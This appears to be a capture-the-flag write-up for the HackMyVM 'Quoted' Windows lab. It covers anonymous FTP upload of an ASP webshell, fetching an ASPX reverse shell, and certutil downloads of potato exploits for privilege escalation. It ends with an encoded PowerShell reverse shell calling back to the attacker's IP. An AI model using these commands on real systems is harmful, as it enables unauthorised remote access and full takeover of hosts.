# Quoted

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.69:21
Open 10.0.2.69:80
Open 10.0.2.69:135
Open 10.0.2.69:139
Open 10.0.2.69:445
Open 10.0.2.69:5357
Open 10.0.2.69:49153
Open 10.0.2.69:49154
Open 10.0.2.69:49155
Open 10.0.2.69:49156
Open 10.0.2.69:49158
Open 10.0.2.69:49152
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.69

PORT      STATE SERVICE      REASON  VERSION
21/tcp    open  ftp          syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-05-24  12:16PM       <DIR>          aspnet_client
| 10-05-24  12:27AM                  689 iisstart.htm
|_10-05-24  12:27AM               184946 welcome.png
80/tcp    open  http         syn-ack Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: QUOTED-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 54342/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31666/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23217/udp): CLEAN (Timeout)
|   Check 4 (port 12586/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: quoted-PC
|   NetBIOS computer name: QUOTED-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-01T22:18:16+03:00
| nbstat: NetBIOS name: QUOTED-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4f:36:6e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   QUOTED-PC<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   QUOTED-PC<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   08:00:27:4f:36:6e:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-10-01T19:18:16
|_  start_date: 2025-10-01T19:16:23
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -1h00m00s, deviation: 1h43m54s, median: -1s
```
:::

## FTP

FTP seems to be serving IIS and we can upload files
```bash
└─$ ftp anonymous@10.0.2.69
Connected to 10.0.2.69.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49167|)
125 Data connection already open; Transfer starting.
10-05-24  12:16PM       <DIR>          aspnet_client
10-01-25  10:21PM                 1581 cmdasp.asp
10-05-24  12:27AM                  689 iisstart.htm
10-05-24  12:27AM               184946 welcome.png
226 Transfer complete.
ftp> put /usr/share/webshells/asp/cmdasp.asp cmdasp.asp
local: /usr/share/webshells/asp/cmdasp.asp remote: cmdasp.asp
229 Entering Extended Passive Mode (|||49168|)
125 Data connection already open; Transfer starting.
100% |*********************************************************************************************************************************************************************|  1581        8.51 MiB/s    --:-- ETA
226 Transfer complete.
1581 bytes sent in 00:00 (1.12 MiB/s)
ftp> exit
221 Goodbye.
```

## HTTP

![writeup.png](/assets/pentest/hackmyvm/quoted/writeup.png)

Upload reverse shell instead
```bash
└─$ curl https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx -Ls | sed -e 's/127.0.0.1/10.0.2.15/' -e 's/1234/4444/' > shell.aspx
└─$ ftp anonymous@10.0.2.69
ftp> put shell.aspx
```

### User.txt

```bash
c:\Users\quoted>type .\Desktop\user.txt
HMV{User_Flag_Obtained}
```

## Privilege Escalation

We have quite a lot of privileges
```bash
c:\Users\quoted>whoami /priv
AYRICALIK BLGLER
----------------------

Ayrcalk Ad                 Aklama                                                 Durum
============================= ======================================================== ==========
SeAssignPrimaryTokenPrivilege lem dzeyi belirtecini deitir                        Devre D
SeIncreaseQuotaPrivilege      lem iin bellek kotalar ayarla                        Devre D
SeSecurityPrivilege           Denetimi ve gvenlik gnln ynet                     Devre D
SeShutdownPrivilege           Sistemi kapat                                            Devre D
SeAuditPrivilege              Gvenlik denetimleri olutur                             Devre D
SeChangeNotifyPrivilege       apraz gei denetimini atla                             Etkin
SeUndockPrivilege             Bilgisayar takma biriminden kar                       Devre D
SeImpersonatePrivilege        Kimlik dorulamasndan sonra istemcinin zelliklerini al Etkin
SeCreateGlobalPrivilege       Genel nesneler olutur                                   Etkin
SeIncreaseWorkingSetPrivilege lem alma kmesini artr                             Devre D
SeTimeZonePrivilege           Saat dilimini deitir                                   Devre D
```

`SeImpersonatePrivilege` privilege stands out.

[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

EFS is the easiest potato I used, I had it compiled already on my box but it didn't work because it's missing libraries.
```bash
└─$ cp /opt/scripts/exploit/EfsPotato.exe .
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.69 - - [01/Oct/2025 15:49:06] "GET /EfsPotato.exe HTTP/1.1" 200 -
10.0.2.69 - - [01/Oct/2025 15:49:09] "GET /EfsPotato.exe HTTP/1.1" 200 -
---
c:\Users\quoted>certutil.exe -urlcache -f http://10.0.2.15/EfsPotato.exe efs.exe
c:\Users\quoted>.\efs.exe
Unhandled Exception: System.TypeLoadException: Could not load type 'System.Security.Claims.ClaimsIdentity' from assembly 'mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'.
   at Zcg.Exploits.Local.EfsPotato.Main(String[] args)

```

Next up Juicy Potato
```powershell
└─$ curl -LOs https://github.com/k4sth4/Juicy-Potato/raw/refs/heads/main/x64/jp.exe
---
c:\Users\quoted>certutil.exe -urlcache -f http://10.0.2.15/jp.exe jp.exe

# Make sure to type Administrators group name in Spanish
c:\Users\quoted>.\jp.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c net net localgroup Administradores quoted /add" -l 1234
```

Hmm... this did work, but also didn't
```powershell
c:\Users>whoami
nt authority\network service
```

We are not `quoted` user!

Hmm... while I was trying to get reverse shell on port 4444 again with another listener some weird thing happened and I got reverse shell on current shell instead of new one... (Windows things I guess)
```bash
C:\Users\quoted>.\jp.exe -t * -p "C:\Windows\system32\cmd.exe" -a "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADIALgAxADUAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" -l 1235
```

### Root.txt

```bash
C:\>type \Users\Administrator\Desktop\root.txt
HMV{Elevated_Shell_Again}
```